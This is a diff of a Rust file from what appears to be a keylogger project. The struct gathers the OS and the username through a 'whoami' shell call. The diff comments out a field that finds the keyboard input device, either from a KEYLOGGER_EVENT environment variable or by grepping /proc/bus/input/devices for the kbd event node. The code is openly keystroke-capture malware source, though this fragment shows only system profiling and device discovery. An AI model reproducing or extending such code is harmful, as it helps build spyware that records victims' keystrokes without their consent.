@@ -9,7 +9,7 @@ use std::process::Command;
 pub struct SystemDetails {
     pub os: String,
     pub username: String,
-    pub event_path: String,
+    // pub event_path: String,
 }
 
 //Function to get system details
@@ -35,24 +35,24 @@ impl SystemDetails {
             username:shell_command("whoami"),
             // Allow the caller to force a specific event device via the KEYLOGGER_EVENT env var.
             // If the variable is set (and non‑empty) we use it; otherwise we fall back to the original heuristic.
-            event_path: {
-                if let Ok(val) = std::env::var("KEYLOGGER_EVENT") {
-                    if !val.is_empty() {
-                        println!("[DEBUG] KEYLOGGER_EVENT env var detected: {}", val);
-                        format!("/dev/input/{}", val)
-                    } else {
-                        let ev = shell_command(
-                            "grep -E 'Handlers.*kbd' /proc/bus/input/devices | grep -Eo 'event[0-9]+' | sort -V | tail -n1",
-                        );
-                        format!("/dev/input/{}", ev)
-                    }
-                } else {
-                    let ev = shell_command(
-                        "grep -E 'Handlers.*kbd' /proc/bus/input/devices | grep -Eo 'event[0-9]+' | sort -V | tail -n1",
-                    );
-                    format!("/dev/input/{}", ev)
-                }
-            },
+            // event_path: {
+            //     if let Ok(val) = std::env::var("KEYLOGGER_EVENT") {
+            //         if !val.is_empty() {
+            //             println!("[DEBUG] KEYLOGGER_EVENT env var detected: {}", val);
+            //             format!("/dev/input/{}", val)
+            //         } else {
+            //             let ev = shell_command(
+            //                 "grep -E 'Handlers.*kbd' /proc/bus/input/devices | grep -Eo 'event[0-9]+' | sort -V | tail -n1",
+            //             );
+            //             format!("/dev/input/{}", ev)
+            //         }
+            //     } else {
+            //         let ev = shell_command(
+            //             "grep -E 'Handlers.*kbd' /proc/bus/input/devices | grep -Eo 'event[0-9]+' | sort -V | tail -n1",
+            //         );
+            //         format!("/dev/input/{}", ev)
+            //     }
+            // },
         }
 
     }
